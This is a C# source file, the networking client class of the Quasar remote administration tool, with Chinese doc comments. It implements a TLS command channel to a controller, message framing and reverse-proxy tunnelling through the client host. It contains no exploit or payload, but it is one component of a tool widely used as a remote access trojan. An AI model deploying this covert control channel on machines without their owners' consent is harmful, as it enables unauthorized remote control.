﻿using Quasar.Client.ReverseProxy;
using Quasar.Common.Extensions;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Quasar.Client.Networking
{
    public class Client : ISender
    {
        /// <summary>
        /// 由于客户端出现不可恢复的问题而发生。
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// 表示将处理客户端故障的方法。
        /// </summary>
        /// <param name="s">已失败的客户端。</param>
        /// <param name="ex">包含有关客户端故障原因信息的异常。</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// 触发一个事件，通知订阅者客户端已失败。
        /// </summary>
        /// <param name="ex">包含有关客户端故障原因信息的异常。</param>
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        /// <summary>
        /// 当客户端状态发生变化时发生。
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// 表示将处理客户端状态更改的方法
        /// </summary>
        /// <param name="s">更改了状态的客户端。</param>
        /// <param name="connected">客户端的新连接状态。</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// 触发一个事件，通知订阅者客户端状态已更改。
        /// </summary>
        /// <param name="connected">客户端的新连接状态。</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);
        }

        /// <summary>
        /// 当从服务器接收到消息时发生。
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// 表示将处理来自服务器的消息的方法。
        /// </summary>
        /// <param name="s">已接收到消息的客户端。</param>
        /// <param name="message">已由服务器接收的消息。</param>
        /// <param name="messageLength">消息的长度。</param>
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// 触发一个事件，通知订阅者服务器已接收到消息。
        /// </summary>
        /// <param name="message">已由服务器接收的消息。</param>
        /// <param name="messageLength">消息的长度。</param>
        private void OnClientRead(IMessage message, int messageLength)
        {
            var handler = ClientRead;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// 当客户端发送消息时发生。
        /// </summary>
        public event ClientWriteEventHandler ClientWrite;

        /// <summary>
        /// 表示将处理已发送消息的方法。
        /// </summary>
        /// <param name="s">已发送消息的客户端。</param>
        /// <param name="message">已由客户端发送的消息。</param>
        /// <param name="messageLength">消息的长度。</param>
        public delegate void ClientWriteEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// 触发一个事件，通知订阅者客户端已发送消息。
        /// </summary>
        /// <param name="message">已由客户端发送的消息。</param>
        /// <param name="messageLength">消息的长度。</param>
        private void OnClientWrite(IMessage message, int messageLength)
        {
            var handler = ClientWrite;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// 接收到的消息类型。
        /// </summary>
        public enum ReceiveType
        {
            Header,
            Payload
        }

        /// <summary>
        /// 以字节为单位的接收数据缓冲区大小。
        /// </summary>
        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB

        /// <summary>
        /// 以毫秒为单位的保活时间。
        /// </summary>
        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        /// <summary>
        /// 以毫秒为单位的保活间隔。
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        /// <summary>
        /// 以字节为单位的头部大小。
        /// </summary>
        public int HEADER_SIZE { get { return 4; } } // 4B

        /// <summary>
        /// 以字节为单位的消息最大大小。
        /// </summary>
        public int MAX_MESSAGE_SIZE { get { return (1024 * 1024) * 5; } } // 5MB

        /// <summary>
        /// 返回包含此客户端所有代理客户端的数组。
        /// </summary>
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        /// <summary>
        /// 获取客户端当前是否连接到服务器。
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        /// 用于通信的流。
        /// </summary>
        private SslStream _stream;

        /// <summary>
        /// 服务器证书。
        /// </summary>
        private readonly X509Certificate2 _serverCertificate;

        /// <summary>
        /// 此客户端持有的所有已连接代理客户端的列表。
        /// </summary>
        private List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();

        /// <summary>
        /// 消息类型的内部索引。
        /// </summary>
        private int _typeIndex;

        /// <summary>
        /// 代理客户端列表的锁定对象。
        /// </summary>
        private readonly object _proxyClientsLock = new object();

        /// <summary>
        /// 传入消息的缓冲区。
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// 客户端传入负载的缓冲区。
        /// </summary>
        private byte[] _payloadBuffer;

        /// <summary>
        /// 保存要发送的消息的队列。
        /// </summary>
        private readonly Queue<IMessage> _sendBuffers = new Queue<IMessage>();

        /// <summary>
        /// 确定客户端当前是否正在发送消息。
        /// </summary>
        private bool _sendingMessages;

        /// <summary>
        /// 发送消息布尔值的锁定对象。
        /// </summary>
        private readonly object _sendingMessagesLock = new object();

        /// <summary>
        /// 保存要读取的缓冲区的队列。
        /// </summary>
        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        /// <summary>
        /// 确定客户端当前是否正在读取消息。
        /// </summary>
        private bool _readingMessages;

        /// <summary>
        /// 读取消息布尔值的锁定对象。
        /// </summary>
        private readonly object _readingMessagesLock = new object();

        // Receive info
        private int _readOffset;
        private int _writeOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        /// <summary>
        /// 互斥锁防止在<see cref="_stream"/>上进行多个同时写操作。
        /// </summary>
        private readonly Mutex _singleWriteMutex = new Mutex();

        /// <summary>
        /// 客户端的构造函数，初始化序列化器类型。
        /// </summary>
        /// <param name="serverCertificate">服务器证书。</param>
        protected Client(X509Certificate2 serverCertificate)
        {
            _serverCertificate = serverCertificate;
            _readBuffer = new byte[BUFFER_SIZE];
            TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
        }

        /// <summary>
        /// 尝试连接到指定端口上的指定IP地址。
        /// </summary>
        /// <param name="ip">要连接的IP地址。</param>
        /// <param name="port">主机的端口。</param>
        protected void Connect(IPAddress ip, ushort port)
        {
            Socket handle = null;
            try
            {
                Disconnect();

                handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                handle.Connect(ip, port);

                if (handle.Connected)
                {
                    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
                    _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
                    _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
                    OnClientState(true);
                }
                else
                {
                    handle.Dispose();
                }
            }
            catch (Exception ex)
            {
                handle?.Dispose();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// 通过将服务器证书与包含的服务器证书进行比较来验证服务器证书。
        /// </summary>
        /// <param name="sender">回调的发送方。</param>
        /// <param name="certificate">要验证的服务器证书。</param>
        /// <param name="chain">X.509链。</param>
        /// <param name="sslPolicyErrors">SSL策略错误。</param>
        /// <returns>当验证成功时返回<value>true</value>，否则返回<value>false</value>。</returns>
        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            // 用于调试时不验证服务器证书
            return true;
#else
            var serverCsp = (RSACryptoServiceProvider)_serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(certificate).PublicKey.Key;
            // 将接收到的服务器证书与包含的服务器证书进行比较，以验证我们是否连接到了正确的服务器
            return _serverCertificate.Equals(certificate);
#endif
        }

        private void AsyncReceive(IAsyncResult result)
        {
            int bytesTransferred;

            try
            {
                bytesTransferred = _stream.EndRead(result);

                if (bytesTransferred <= 0)
                    throw new Exception("no bytes transferred");
            }
            catch (NullReferenceException)
            {
                return;
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            catch (Exception)
            {
                Disconnect();
                return;
            }

            byte[] received = new byte[bytesTransferred];

            try
            {
                Array.Copy(_readBuffer, received, received.Length);
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
                return;
            }

            lock (_readBuffers)
            {
                _readBuffers.Enqueue(received);
            }

            lock (_readingMessagesLock)
            {
                if (!_readingMessages)
                {
                    _readingMessages = true;
                    ThreadPool.QueueUserWorkItem(AsyncReceive);
                }
            }

            try
            {
                _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(object state)
        {
            while (true)
            {
                byte[] readBuffer;
                lock (_readBuffers)
                {
                    if (_readBuffers.Count == 0)
                    {
                        lock (_readingMessagesLock)
                        {
                            _readingMessages = false;
                        }
                        return;
                    }

                    readBuffer = _readBuffers.Dequeue();
                }

                _readableDataLen += readBuffer.Length;
                bool process = true;
                while (process)
                {
                    switch (_receiveState)
                    {
                        case ReceiveType.Header:
                            {
                                if (_payloadBuffer == null)
                                    _payloadBuffer = new byte[HEADER_SIZE];

                                if (_readableDataLen + _writeOffset >= HEADER_SIZE)
                                {
                                    // 完全接收头部
                                    int headerLength = HEADER_SIZE - _writeOffset;

                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, headerLength);

                                        _payloadLen = BitConverter.ToInt32(_payloadBuffer, _readOffset);

                                        if (_payloadLen <= 0 || _payloadLen > MAX_MESSAGE_SIZE)
                                            throw new Exception("invalid header");

                                        // try to re-use old payload buffers which fit
                                        if (_payloadBuffer.Length <= _payloadLen + HEADER_SIZE)
                                            Array.Resize(ref _payloadBuffer, _payloadLen + HEADER_SIZE);
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _readableDataLen -= headerLength;
                                    _writeOffset += headerLength;
                                    _readOffset += headerLength;
                                    _receiveState = ReceiveType.Payload;
                                }
                                else // _readableDataLen + _writeOffset < HeaderSize
                                {
                                    // 仅接收了头部的一部分
                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, _readableDataLen);
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }
                                    _readOffset += _readableDataLen;
                                    _writeOffset += _readableDataLen;
                                    process = false;
                                    // nothing left to process
                                }
                                break;
                            }
                        case ReceiveType.Payload:
                            {
                                int length = (_writeOffset - HEADER_SIZE + _readableDataLen) >= _payloadLen
                                    ? _payloadLen - (_writeOffset - HEADER_SIZE)
                                    : _readableDataLen;

                                try
                                {
                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
                                }
                                catch (Exception)
                                {
                                    process = false;
                                    Disconnect();
                                    break;
                                }

                                _writeOffset += length;
                                _readOffset += length;
                                _readableDataLen -= length;

                                if (_writeOffset - HEADER_SIZE == _payloadLen)
                                {
                                    // 完全接收负载
                                    try
                                    {
                                        using (PayloadReader pr = new PayloadReader(_payloadBuffer, _payloadLen + HEADER_SIZE, false))
                                        {
                                            IMessage message = pr.ReadMessage();

                                            OnClientRead(message, _payloadBuffer.Length);
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _receiveState = ReceiveType.Header;
                                    _payloadLen = 0;
                                    _writeOffset = 0;
                                }

                                if (_readableDataLen == 0)
                                    process = false;

                                break;
                            }
                    }
                }

                _readOffset = 0;
                _readableDataLen = 0;
            }
        }

        /// <summary>
        /// 向已连接的服务器发送消息。
        /// </summary>
        /// <typeparam name="T">消息的类型。</typeparam>
        /// <param name="message">要发送的消息。</param>
        public void Send<T>(T message) where T : IMessage
        {
            if (!Connected || message == null) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Enqueue(message);

                lock (_sendingMessagesLock)
                {
                    if (_sendingMessages) return;

                    _sendingMessages = true;
                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
                }
            }
        }

        /// <summary>
        /// 向已连接的服务器发送消息。
        /// 阻塞线程直到消息已发送。
        /// </summary>
        /// <typeparam name="T">消息的类型。</typeparam>
        /// <param name="message">要发送的消息。</param>
        public void SendBlocking<T>(T message) where T : IMessage
        {
            if (!Connected || message == null) return;

            SafeSendMessage(message);
        }

        /// <summary>
        /// 安全地发送消息并防止在<see cref="_stream"/>上进行多个同时
        /// 写操作。
        /// </summary>
        /// <param name="message">要发送的消息。</param>
        private void SafeSendMessage(IMessage message)
        {
            try
            {
                _singleWriteMutex.WaitOne();
                using (PayloadWriter pw = new PayloadWriter(_stream, true))
                {
                    OnClientWrite(message, pw.WriteMessage(message));
                }
            }
            catch (Exception)
            {
                Disconnect();
                SendCleanup(true);
            }
            finally
            {
                _singleWriteMutex.ReleaseMutex();
            }
        }

        private void ProcessSendBuffers(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                IMessage message;
                lock (_sendBuffers)
                {
                    if (_sendBuffers.Count == 0)
                    {
                        SendCleanup();
                        return;
                    }

                    message = _sendBuffers.Dequeue();
                }

                SafeSendMessage(message);
            }
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendingMessagesLock)
            {
                _sendingMessages = false;
            }

            if (!clear) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Clear();
            }
        }

        /// <summary>
        /// 断开客户端与服务器的连接，断开由此客户端持有的所有代理，
        /// 并释放与此客户端关联的其他资源。
        /// </summary>
        public void Disconnect()
        {
            if (_stream != null)
            {
                _stream.Close();
                _readOffset = 0;
                _writeOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                _receiveState = ReceiveType.Header;
                //_singleWriteMutex.Dispose(); TODO: fix socket re-use by creating new client on disconnect

                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        try
                        {
                            foreach (ReverseProxyClient proxy in _proxyClients)
                                proxy.Disconnect();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }

            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(new ReverseProxyClient(command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}
